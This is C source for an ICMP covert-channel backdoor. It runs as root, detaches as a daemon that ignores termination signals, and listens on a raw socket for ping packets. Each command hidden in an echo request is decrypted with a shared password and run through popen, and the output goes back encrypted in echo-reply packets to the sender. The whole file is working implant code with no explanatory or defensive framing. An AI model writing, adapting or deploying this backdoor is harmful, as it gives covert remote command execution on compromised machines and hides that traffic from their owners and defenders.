#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <openssl/blowfish.h>
#include "backdoor.h"

int main(int argc, char *argv, char *env)
{
  int sock;
  unsigned int packetsize = sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(struct bd_data);
  unsigned char packet[packetsize];
  struct iphdr *ip = (struct iphdr *)packet;
  struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
  struct bd_data *data = (struct bd_data *)(packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
  FILE *result;
  char c, cmd[BUFSIZE], buf[BUFSIZE], sendbuf[BUFSIZE];
  int i = 0;
  extern int errno;

  if(getuid() != 0) { printf("You need to be root!\n"); exit(1); }

  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
  signal(SIGINT,SIG_IGN);
  signal(SIGHUP,SIG_IGN);
  signal(SIGTERM,SIG_IGN);
  if(fork() != 0) { exit(0); }
  chdir("/");
  setpgrp();

  if( (sock = socket(AF_INET, SOCK_RAW, 1)) < 0) { perror("socket"); exit(1); }

  while(1)
    {
      memset(packet,0,packetsize);
      read(sock,packet,packetsize);

      if( (icmp->type == ICMP_ECHO) && (icmp->code == 0) )
	{	  
	  memset(cmd,0,BUFSIZE);
	  decrypt(data->cmd,cmd,data->len,PASSWORD);
	  
	  if( (result = popen(cmd,"r")) != NULL )
	    {
	      memset(buf,0,BUFSIZE);
	      i = 0;
	      
	      while( (c = getc(result)) != EOF )
		{
		  if(i > BUFSIZE) { break; }
		  buf[i] = c;
		  i++;
		}
	      
	      if(i == 0)
		{
		  strcpy(buf,"Command was executed successfully.");
		}
	      
	      encrypt(buf,sendbuf,strlen(buf),PASSWORD);	      
	      send_result(&ip->saddr,sendbuf,strlen(buf)); 
	      pclose(result);
	    }
	  else
	    {
	      strcpy(buf,strerror(errno));
	      encrypt(buf,sendbuf,strlen(buf),PASSWORD);	      
	      send_result(&ip->saddr,sendbuf,strlen(buf));
	    }
	}
    }

  close(sock);
  return 0;
}

int send_result(u_int *dst_ip, char *result, u_int len)
{
  int sock;
  int one = 1;
  struct sockaddr_in addr;
  unsigned int packetsize = sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(struct bd_data);
  unsigned char packet[packetsize];
  struct iphdr *ip = (struct iphdr *)packet;
  struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
  struct bd_data *data = (struct bd_data *)(packet + sizeof(struct iphdr) + sizeof(struct icmphdr));  

  memset(packet,0,packetsize);

  if( (sock = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == -1 ) { perror("socket"); return 1; }
  if( setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one)) == -1 ) { perror("setsockopt"); return 1; }

  ip->version = 4;
  ip->ihl = 5;    
  ip->id = htonl(random());
  ip->daddr = *dst_ip;     
  ip->ttl = 123;           
  ip->protocol = IPPROTO_ICMP;
  ip->tot_len = packetsize;   
  ip->check = 0;              

  icmp->type = ICMP_ECHOREPLY;
  icmp->code = 0;
  icmp->checksum = 0;

  data->len = len;
  strncpy(data->cmd,result,BUFSIZE);

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = ip->saddr;

  if( (sendto(sock,packet,packetsize,0,(struct sockaddr*)&addr,sizeof(struct sockaddr_in))) == -1 )
    {
      perror("send");
      return 1;
    }

  return 0;
}
